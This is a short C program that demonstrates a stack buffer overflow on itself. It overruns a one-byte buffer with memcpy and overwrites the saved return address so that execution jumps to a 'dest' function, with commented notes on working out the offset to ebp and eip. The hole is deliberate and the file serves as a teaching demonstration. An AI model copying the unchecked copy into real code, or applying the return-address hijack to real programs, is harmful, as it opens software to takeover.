#include "stdio.h"
#include "string.h"

#define OFFSET 0xD
#define _OFFSET (ebp - ((void*)buf))

#define LEN (OFFSET + 2*sizeof(void*))

void dest(void)
{
    printf("In dest now\n");
    exit(0);
}

void vulnerability(char *input)
{
    char buf[0x1] = {0};

    // get ebp:
    // void* ebp = 0;
    // asm volatile("movl %%ebp, %0": "=r" (ebp));
    // printf("offset: %x\n", ebp - ((void*)buf)); // 0xD

    // calc eip by ebp:
    // printf("eip: %x\n", *(((int*)ebp) + 1));

    memcpy(buf, input, LEN);

    return;
}

int main()
{
    // printf("main: %x\n", main);

    // get a eip in main: 
    // void *eip = 0;
    // asm volatile("call 1f\n1: pop %0" : "=r" (eip));
    // printf("eip: %x\n", eip);

    char payload[LEN] = {0}; 
    *((void**)(payload + LEN - sizeof(void*))) = dest;
    vulnerability(payload);
}
